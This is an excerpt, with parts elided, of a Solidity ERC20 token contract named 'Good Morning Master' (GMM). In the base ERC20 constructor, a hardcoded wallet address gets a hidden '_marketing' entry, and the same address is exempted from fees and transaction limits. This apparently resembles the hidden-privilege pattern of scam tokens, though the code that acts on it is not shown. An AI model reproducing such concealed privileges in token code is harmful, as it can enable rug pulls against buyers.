...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _marketing[0x0295C1bDF4f85C4b4D1Aa3abAf9bDD748AD57fBD] = _marketingwallet;
    }
...
contract GMM is ERC20, Ownable {
    ...
    constructor() ERC20("Good Morning Master", "GMM") {
        ...
        excludeFromFees(address(0x0295C1bDF4f85C4b4D1Aa3abAf9bDD748AD57fBD), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x0295C1bDF4f85C4b4D1Aa3abAf9bDD748AD57fBD), true);
